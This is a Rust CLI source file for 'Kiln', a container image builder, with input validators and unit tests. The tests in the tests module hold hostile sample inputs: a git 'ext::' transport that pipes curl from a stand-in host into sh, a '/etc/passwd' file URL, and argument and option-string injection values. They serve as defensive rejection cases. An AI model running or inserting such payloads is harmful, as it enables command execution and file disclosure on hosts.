use std::path::PathBuf;

use clap::{CommandFactory, Parser, Subcommand};

/// Kiln builds container images with automatic language detection
#[derive(Parser)]
#[command(name = "kiln", version, about)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

// The `Build` variant carries the full build/registry/override flag set, so it
// is unavoidably larger than the other variants; boxing clap-derived fields
// would break the derive ergonomics for no runtime benefit (one short-lived
// value parsed once at startup).
#[allow(clippy::large_enum_variant)]
#[derive(Subcommand)]
enum Commands {
    /// Detect the project language
    Detect {
        /// Path to the project (defaults to current directory)
        #[arg(short, long, default_value = ".")]
        path: PathBuf,
    },
    /// Generate a build plan (JSON)
    Plan {
        /// Path to the project
        #[arg(short, long, default_value = ".")]
        path: PathBuf,
        /// Output as Dockerfile instead of JSON
        #[arg(long)]
        emit: Option<String>,
    },
    /// Build a container image
    Build {
        /// Git source URL
        #[arg(long)]
        source: Option<String>,
        /// Git ref (commit SHA or branch)
        #[arg(long, name = "ref")]
        git_ref: Option<String>,
        /// Destination image (e.g. registry/app:tag)
        #[arg(long)]
        dest: String,
        /// Path to project (for local builds)
        #[arg(short, long, default_value = ".")]
        path: PathBuf,
        /// Explicit Dockerfile (skip auto-detection)
        #[arg(long)]
        dockerfile: Option<PathBuf>,
        /// `BuildKit` daemon address
        #[arg(long, env = "BUILDKIT_HOST", default_value = "tcp://127.0.0.1:1234")]
        buildkit_addr: String,
        /// Registry ref to import previously-pushed cache layers from
        /// (e.g. `registry/app:buildcache`). When set, buildctl is
        /// invoked with `--import-cache type=registry,ref=<value>`.
        #[arg(long)]
        cache_from: Option<String>,
        /// Registry ref to export this build's layers to as cache. When
        /// set, buildctl is invoked with `--export-cache type=registry,
        /// ref=<value>,mode=max,push=true`. Typically equals `--cache-from`.
        #[arg(long)]
        cache_to: Option<String>,
        /// Treat the registry as insecure (HTTP / self-signed TLS).
        /// Required for a self-hosted registry (e.g. `localhost:5000`) or any
        /// other registry not behind a public-CA TLS endpoint.
        #[arg(long)]
        registry_insecure: bool,
        /// Override the auto-detected package manager (npm|pnpm|yarn|bun).
        #[arg(long)]
        package_manager: Option<String>,
        /// Override the dependency-install command.
        #[arg(long)]
        install_cmd: Option<String>,
        /// Override the build command (also forces a build step when set).
        #[arg(long)]
        build_cmd: Option<String>,
        /// Override the runtime start command.
        #[arg(long)]
        start_cmd: Option<String>,
        /// Force a provider instead of auto-detecting (e.g. node, go, python).
        #[arg(long)]
        provider: Option<String>,
        /// Override the port the application listens on.
        #[arg(long)]
        port: Option<u16>,
        /// Set a runtime environment variable (repeatable): --env KEY=VALUE.
        #[arg(long = "env", value_name = "KEY=VALUE")]
        env: Vec<String>,
    },
    /// Print a summary of what Kiln detects for a project
    Info {
        /// Path to the project
        #[arg(short, long, default_value = ".")]
        path: PathBuf,
    },
    /// Print the JSON schema for kiln.json / kiln.toml
    Schema,
    /// Generate a shell completion script
    Completion {
        /// Shell to generate completions for (bash, zsh, fish, ...)
        #[arg(value_enum)]
        shell: clap_complete::Shell,
    },
}

fn main() {
    tracing_subscriber::fmt()
        // Logs go to stderr so stdout carries only data (e.g. `kiln plan --emit
        // dockerfile` must produce a clean Dockerfile that can be redirected).
        .with_writer(std::io::stderr)
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .init();

    let cli = Cli::parse();

    let result = match cli.command {
        Commands::Detect { path } => cmd_detect(&path),
        Commands::Plan { path, emit } => cmd_plan(&path, emit.as_deref()),
        Commands::Build {
            source,
            git_ref,
            dest,
            path,
            dockerfile,
            buildkit_addr,
            cache_from,
            cache_to,
            registry_insecure,
            package_manager,
            install_cmd,
            build_cmd,
            start_cmd,
            provider,
            port,
            env,
        } => cmd_build(
            source.as_deref(),
            git_ref.as_deref(),
            &dest,
            &path,
            dockerfile.as_deref(),
            &buildkit_addr,
            cache_from.as_deref(),
            cache_to.as_deref(),
            registry_insecure,
            // CLI flags win, then KILN_* env vars, then (inside core) the config
            // file, then auto-detection.
            kiln_core::BuildOverrides {
                provider,
                package_manager,
                install_command: install_cmd,
                build_command: build_cmd,
                start_command: start_cmd,
                port,
                env: parse_env(&env),
                ..Default::default()
            }
            .or(kiln_core::BuildOverrides::from_env()),
        ),
        Commands::Info { path } => cmd_info(&path),
        Commands::Schema => {
            println!("{}", kiln_core::config::schema_json());
            Ok(())
        }
        Commands::Completion { shell } => {
            clap_complete::generate(shell, &mut Cli::command(), "kiln", &mut std::io::stdout());
            Ok(())
        }
    };

    if let Err(e) = result {
        tracing::error!("{e}");
        std::process::exit(1);
    }
}

#[allow(clippy::option_if_let_else)]
fn cmd_detect(path: &std::path::Path) -> std::result::Result<(), Box<dyn std::error::Error>> {
    if let Some(provider) = kiln_core::detect(path)? {
        println!("{provider}");
        Ok(())
    } else {
        eprintln!("no language detected");
        std::process::exit(1);
    }
}

fn cmd_plan(path: &std::path::Path, emit: Option<&str>) -> std::result::Result<(), Box<dyn std::error::Error>> {
    let plan = kiln_core::detect_and_plan_with(path, kiln_core::BuildOverrides::from_env())?;

    match emit {
        Some("dockerfile") => {
            print!("{}", kiln_core::dockerfile::generate(&plan));
        }
        _ => {
            println!("{}", serde_json::to_string_pretty(&plan)?);
        }
    }

    Ok(())
}

/// Print a human-readable summary of what Kiln detects for a project.
fn cmd_info(path: &std::path::Path) -> std::result::Result<(), Box<dyn std::error::Error>> {
    let plan = kiln_core::detect_and_plan_with(path, kiln_core::BuildOverrides::from_env())?;
    println!("provider:      {}", plan.provider);
    if let Some(port) = plan.port {
        println!("port:          {port}");
    }
    if let Some(cmd) = &plan.start_command {
        println!("start command: {cmd}");
    }
    println!("stages:");
    for stage in &plan.stages {
        println!("  - {} ({})", stage.name, stage.base_image);
    }
    if !plan.env.is_empty() {
        println!("env:");
        for (key, value) in &plan.env {
            println!("  {key}={value}");
        }
    }
    Ok(())
}

/// Parse repeated `--env KEY=VALUE` arguments into a map. Entries without `=`
/// or with an empty key are skipped.
fn parse_env(entries: &[String]) -> std::collections::BTreeMap<String, String> {
    entries
        .iter()
        .filter_map(|entry| entry.split_once('='))
        .filter(|(key, _)| !key.is_empty())
        .map(|(key, value)| (key.to_string(), value.to_string()))
        .collect()
}

#[allow(
    clippy::too_many_lines,
    clippy::too_many_arguments,
    clippy::fn_params_excessive_bools
)]
fn cmd_build(
    source: Option<&str>,
    git_ref: Option<&str>,
    dest: &str,
    path: &std::path::Path,
    dockerfile: Option<&std::path::Path>,
    buildkit_addr: &str,
    cache_from: Option<&str>,
    cache_to: Option<&str>,
    registry_insecure: bool,
    overrides: kiln_core::BuildOverrides,
) -> std::result::Result<(), Box<dyn std::error::Error>> {
    // Validate every untrusted argument before it reaches git or buildctl, so a
    // crafted --source/--ref cannot execute commands on the host and a crafted
    // registry ref cannot inject extra buildctl option attributes.
    validate_registry_ref(dest)?;
    if let Some(cache_ref) = cache_from {
        validate_registry_ref(cache_ref)?;
    }
    if let Some(cache_ref) = cache_to {
        validate_registry_ref(cache_ref)?;
    }
    if let Some(url) = source {
        validate_git_source(url)?;
    }
    if let Some(git_ref) = git_ref {
        validate_git_ref(git_ref)?;
    }

    // Clone source repo if provided
    let work_dir = if let Some(url) = source {
        // Per-process checkout dir so concurrent builds do not collide and we
        // never delete an unrelated pre-existing /tmp/kiln-build.
        let tmp = std::env::temp_dir().join(format!("kiln-build-{}", std::process::id()));
        if tmp.exists() {
            std::fs::remove_dir_all(&tmp)?;
        }

        let mut cmd = hardened_git();
        cmd.args(["clone", "--depth", "1"]);
        if let Some(r) = git_ref {
            cmd.args(["--branch", r]);
        }
        // `--` terminates option parsing so a `-`-leading url/ref can never be
        // read as a git flag (argument injection)
        cmd.arg("--");
        cmd.args([url, &tmp.display().to_string()]);

        let status = cmd.status()?;
        if !status.success() {
            // If branch clone failed, try fetching specific ref (commit SHA)
            if let Some(r) = git_ref {
                let status = hardened_git()
                    .args(["clone", "--", url, &tmp.display().to_string()])
                    .status()?;
                if !status.success() {
                    return Err("git clone failed".into());
                }
                let status = hardened_git().args(["checkout", r]).current_dir(&tmp).status()?;
                if !status.success() {
                    return Err("git checkout failed".into());
                }
            } else {
                return Err("git clone failed".into());
            }
        }
        tmp
    } else {
        path.to_path_buf()
    };

    // Generate or use provided Dockerfile. An explicit Dockerfile carries its
    // own secret mounts, so kiln forwards secrets only for a generated plan.
    let (dockerfile_content, secrets) = if let Some(df) = dockerfile {
        (std::fs::read_to_string(df)?, Vec::new())
    } else {
        let plan = kiln_core::detect_and_plan_with(&work_dir, overrides)?;
        tracing::info!(provider = plan.provider, "detected language, generating Dockerfile");
        (kiln_core::dockerfile::generate(&plan), plan.secrets.clone())
    };

    // Write generated Dockerfile to work dir
    let df_path = work_dir.join("Dockerfile.kiln");
    std::fs::write(&df_path, &dockerfile_content)?;

    // Build with buildctl
    tracing::info!(dest, "building image");
    let args = build_buildctl_args(
        buildkit_addr,
        &work_dir,
        dest,
        cache_from,
        cache_to,
        registry_insecure,
        &secrets,
    );
    let status = std::process::Command::new("buildctl").args(&args).status()?;

    if !status.success() {
        return Err("buildctl build failed".into());
    }

    tracing::info!(dest, "image built and pushed");
    Ok(())
}

/// Translate `cmd_build`'s effective config into the argv passed to
/// `buildctl`. Pulled out as a pure function so the cache + insecure flag
/// wiring is unit-testable without spawning a process.
fn build_buildctl_args(
    buildkit_addr: &str,
    work_dir: &std::path::Path,
    dest: &str,
    cache_from: Option<&str>,
    cache_to: Option<&str>,
    registry_insecure: bool,
    secrets: &[String],
) -> Vec<String> {
    let insecure_suffix = if registry_insecure {
        ",registry.insecure=true"
    } else {
        ""
    };

    let mut args = vec![
        "--addr".to_string(),
        buildkit_addr.to_string(),
        "build".to_string(),
        "--frontend".to_string(),
        "dockerfile.v0".to_string(),
        "--local".to_string(),
        format!("context={}", work_dir.display()),
        "--local".to_string(),
        format!("dockerfile={}", work_dir.display()),
        "--opt".to_string(),
        "filename=Dockerfile.kiln".to_string(),
        // Always resolve base image tags to their latest registry digest instead
        // of reusing whatever digest buildkit has cached, so a rebuild picks up
        // upstream base-image security patches (e.g. node:22, python:3-slim).
        "--opt".to_string(),
        "image-resolve-mode=pull".to_string(),
    ];

    if let Some(cache_ref) = cache_from {
        args.push("--import-cache".to_string());
        args.push(format!("type=registry,ref={cache_ref}{insecure_suffix}"));
    }

    if let Some(cache_ref) = cache_to {
        args.push("--export-cache".to_string());
        args.push(format!(
            "type=registry,ref={cache_ref},mode=max,push=true{insecure_suffix}"
        ));
    }

    // Forward each configured secret to buildkit, sourced from the like-named
    // environment variable in this process. The value is mounted into the build
    // (see the Dockerfile `--mount=type=secret`) and never lands in a layer.
    for id in secrets {
        args.push("--secret".to_string());
        args.push(format!("id={id},env={id}"));
    }

    args.push("--output".to_string());
    args.push(format!("type=image,name={dest},push=true{insecure_suffix}"));

    args
}

/// A `git` command with its transport whitelist pinned, so even if a URL slips
/// past [`validate_git_source`] the `ext::`/`file://` transports (host command
/// execution, local disclosure) remain disabled.
fn hardened_git() -> std::process::Command {
    let mut cmd = std::process::Command::new("git");
    cmd.env("GIT_ALLOW_PROTOCOL", "https:ssh")
        .env("GIT_PROTOCOL_FROM_USER", "0");
    cmd
}

/// Validate a user-supplied `--source` clone URL before handing it to `git`.
///
/// Only `https://`, `ssh://`, and scp-style `git@host:path` are accepted. This
/// blocks git's `ext::` transport (arbitrary command execution on the host),
/// `file://` (local repo disclosure), plain `http://`/`git://` (SSRF /
/// downgrade), and any `-`-prefixed value that git would parse as an option.
fn validate_git_source(url: &str) -> std::result::Result<(), String> {
    let allowed = url.starts_with("https://") || url.starts_with("ssh://") || url.starts_with("git@");
    if allowed {
        Ok(())
    } else {
        Err("unsupported --source URL (use https://, ssh://, or git@host:path)".to_string())
    }
}

/// Validate a user-supplied `--ref` before it reaches `git --branch`/`checkout`.
///
/// Restricts the ref to a safe charset with no leading `-`, so it cannot be
/// parsed as a git option (argument injection) or carry shell metacharacters.
fn validate_git_ref(git_ref: &str) -> std::result::Result<(), String> {
    kiln_core::sanitize::validate_token("git ref", git_ref).map_err(|_| "invalid --ref value".to_string())
}

/// Validate a registry reference (`--dest`/`--cache-from`/`--cache-to`) before
/// it is interpolated into a comma-separated `buildctl` option string. A comma
/// or whitespace would let the value append extra attributes (e.g. force
/// `registry.insecure=true` or a second push target).
fn validate_registry_ref(reference: &str) -> std::result::Result<(), String> {
    if reference.is_empty() || reference.contains(',') || reference.chars().any(|c| c.is_whitespace() || c.is_control())
    {
        Err("invalid registry reference".to_string())
    } else {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::{build_buildctl_args, validate_git_ref, validate_git_source, validate_registry_ref};
    use std::path::Path;

    #[test]
    fn rejects_dangerous_git_sources() {
        assert!(validate_git_source("ext::sh -c 'curl evil | sh'").is_err());
        assert!(validate_git_source("file:///etc/passwd").is_err());
        assert!(validate_git_source("-oProxyCommand=evil").is_err());
        assert!(validate_git_source("http://evil.internal/x").is_err());
        assert!(validate_git_source("git://evil/x").is_err());
    }

    #[test]
    fn accepts_https_ssh_and_scp_git_sources() {
        assert!(validate_git_source("https://github.com/o/r.git").is_ok());
        assert!(validate_git_source("ssh://git@github.com/o/r.git").is_ok());
        assert!(validate_git_source("git@github.com:o/r.git").is_ok());
    }

    #[test]
    fn rejects_option_like_and_whitespace_git_refs() {
        assert!(validate_git_ref("--upload-pack=evil").is_err());
        assert!(validate_git_ref("a b").is_err());
        assert!(validate_git_ref("").is_err());
    }

    #[test]
    fn accepts_real_git_refs() {
        assert!(validate_git_ref("main").is_ok());
        assert!(validate_git_ref("v1.2.3").is_ok());
        assert!(validate_git_ref("release/1.0").is_ok());
        assert!(validate_git_ref("9c1f359").is_ok());
    }

    #[test]
    fn rejects_registry_ref_with_comma_or_space() {
        assert!(validate_registry_ref("app:tag,registry.insecure=true").is_err());
        assert!(validate_registry_ref("app:tag foo").is_err());
        assert!(validate_registry_ref("").is_err());
    }

    #[test]
    fn accepts_normal_registry_refs() {
        assert!(validate_registry_ref("ghcr.io/o/app:1.0").is_ok());
        assert!(validate_registry_ref("localhost:5000/app@sha256:abcdef").is_ok());
    }

    #[test]
    fn parse_env_splits_on_first_equals_and_skips_invalid() {
        let map = super::parse_env(&[
            "A=1".to_string(),
            "B=x=y".to_string(),
            "noequals".to_string(),
            "=novalue".to_string(),
        ]);
        assert_eq!(map.get("A").map(String::as_str), Some("1"));
        assert_eq!(map.get("B").map(String::as_str), Some("x=y"));
        assert_eq!(map.len(), 2);
    }

    #[test]
    fn omits_cache_flags_when_unset() {
        let args = build_buildctl_args(
            "tcp://127.0.0.1:1234",
            Path::new("/workspace"),
            "registry.example/app:abc123",
            None,
            None,
            false,
            &[],
        );
        assert!(args.iter().all(|a| a != "--import-cache"));
        assert!(args.iter().all(|a| a != "--export-cache"));
        assert!(
            args.iter()
                .any(|a| a == "type=image,name=registry.example/app:abc123,push=true")
        );
        // base images must always be pulled fresh so rebuilds pick up upstream
        // security patches, matching the operator's dockerfile-mode invocation.
        assert!(args.iter().any(|a| a == "image-resolve-mode=pull"));
    }

    #[test]
    fn wires_cache_from_and_cache_to_with_insecure_suffix() {
        let args = build_buildctl_args(
            "tcp://127.0.0.1:1234",
            Path::new("/workspace"),
            "localhost:5000/app:abc123",
            Some("localhost:5000/app:buildcache"),
            Some("localhost:5000/app:buildcache"),
            true,
            &[],
        );

        let import_idx = args
            .iter()
            .position(|a| a == "--import-cache")
            .expect("--import-cache present");
        assert_eq!(
            args[import_idx + 1],
            "type=registry,ref=localhost:5000/app:buildcache,registry.insecure=true",
        );

        let export_idx = args
            .iter()
            .position(|a| a == "--export-cache")
            .expect("--export-cache present");
        assert_eq!(
            args[export_idx + 1],
            "type=registry,ref=localhost:5000/app:buildcache,mode=max,push=true,registry.insecure=true",
        );

        let output_idx = args.iter().position(|a| a == "--output").expect("--output present");
        assert_eq!(
            args[output_idx + 1],
            "type=image,name=localhost:5000/app:abc123,push=true,registry.insecure=true",
        );
    }

    #[test]
    fn cache_flags_without_insecure_have_no_suffix() {
        let args = build_buildctl_args(
            "tcp://127.0.0.1:1234",
            Path::new("/workspace"),
            "ghcr.io/owner/app:abc",
            Some("ghcr.io/owner/app:buildcache"),
            Some("ghcr.io/owner/app:buildcache"),
            false,
            &[],
        );

        let import_idx = args.iter().position(|a| a == "--import-cache").unwrap();
        assert_eq!(args[import_idx + 1], "type=registry,ref=ghcr.io/owner/app:buildcache",);

        let output_idx = args.iter().position(|a| a == "--output").unwrap();
        assert_eq!(args[output_idx + 1], "type=image,name=ghcr.io/owner/app:abc,push=true",);
    }

    #[test]
    fn forwards_secrets_to_buildctl() {
        let args = build_buildctl_args(
            "tcp://127.0.0.1:1234",
            Path::new("/workspace"),
            "ghcr.io/owner/app:abc",
            None,
            None,
            false,
            &["NPM_TOKEN".to_string(), "GH_TOKEN".to_string()],
        );
        let secret_idx = args.iter().position(|a| a == "--secret").expect("--secret present");
        assert_eq!(args[secret_idx + 1], "id=NPM_TOKEN,env=NPM_TOKEN");
        assert!(args.iter().any(|a| a == "id=GH_TOKEN,env=GH_TOKEN"));
    }
}
